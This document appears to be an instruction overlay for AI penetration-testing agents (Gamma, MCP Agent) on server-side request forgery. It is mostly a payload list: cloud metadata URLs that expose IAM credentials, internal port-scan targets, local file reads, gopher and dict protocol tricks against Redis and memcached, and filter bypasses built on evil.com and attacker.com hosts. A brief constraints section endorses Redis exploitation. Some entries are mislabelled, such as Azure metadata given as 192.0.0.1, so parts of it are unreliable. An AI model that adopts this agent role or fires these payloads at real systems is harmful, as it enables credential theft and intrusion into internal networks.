# SSRF — Dynamic Overlay

## Metadata
- **Exploit Type**: ssrf
- **Applies To**: Gamma, MCP Agent
- **Loading**: Appended when `exploit_type === "ssrf"`

---

## OVERLAY_CONTEXT

Server-Side Request Forgery (SSRF) tricks the server into making requests to internal or external resources. Success indicators: fetching internal metadata, port scanning internal services, reading local files, or accessing internal APIs.

---

## Internal Targets

### Cloud Metadata (AWS, GCP, Azure)
```
http://169.254.169.254/latest/meta-data/              (AWS)
http://metadata.google.internal/computeMetadata/v1/   (GCP)
http://192.0.0.1/latest/api/                        (Azure)
```

### Internal Port Scanning
```
http://internal-server:22
http://internal-server:80
http://internal-server:443
http://internal-server:3306
http://internal-server:5432
http://internal-server:6379
```

### Local File Access (if curl/wget)
```
file:///etc/passwd
file:///var/www/html/config.php
file:///c:/windows/system32/drivers/etc/hosts
```

---

## Payloads

### Basic Internal Fetch
```
http://localhost:80/admin
http://127.0.0.1:8080/api
http://169.254.169.254/latest/meta-data/
```

### Protocol Switching
```
dict://localhost:11211/stats
sftp://internal-server:22
ldap://internal-server:389
gopher://internal-server:6379/_INFO
```

### Cloud Metadata (AWS)
```
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

### Filter Bypass (URL encoding)
```
127.0.0.1 → 127.0.1
localhost → localhost.attacker.com
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://[::1]/admin
```

### Open Redirect Chaining
```
If https://target.com/redirect?url=http://evil.com
Use as proxy: https://target.com/redirect?url=http://169.254.169.254
```

---

## Bypasses

### localhost Bypass
```
127.0.0.1
localhost
0.0.0.0
[::1]
```

### IPv6 Bypass
```
[::1]
[::ffff:127.0.0.1]
```

### IDN Homograph
```
http://localhost.attacker.com  (if DNS cached)
```

### URL Parsing Confusion
```
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://127.0.0.1:80@evil.com
```

---

## Constraints

```
- NEVER use SSRF to attack internal networks beyond reconnaissance
- For cloud metadata: only enumerate, don't spin up expensive resources
- Gopher protocol can be used for Redis/RMem exploitation if available
- URL encoding bypasses often work when basic filters are in place
- Check for blind SSRF: use time delays or out-of-band detection
```

---

*Overlay version: 1.0*
